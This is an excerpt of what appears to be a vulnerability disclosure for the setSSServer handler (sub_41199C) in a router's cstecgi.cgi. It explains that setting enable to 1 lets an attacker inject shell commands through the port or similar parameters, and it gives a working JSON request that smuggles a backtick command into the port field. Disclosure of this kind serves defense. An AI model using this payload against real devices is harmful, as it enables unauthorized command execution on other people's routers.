...
The vulnerability is located in the function `sub_41199C` within `cstecgi.cgi`, also known as `setSSServer`.

![](Pasted%20image%2020231128182140.png)

We make `enable` to be `1` to enter the `else`.
...
therefore , by controlling parameter `enable` and any one parameter among `port password encryption timeout` , we can finally make an arbitrary command execution
...
{"enable":"1","port":"`id > /1.txt;`","topicurl":"setSSServer","token":"00000000000000000000000000000000"}
~~~
...
![](Pasted%20image%2020231128182120.png)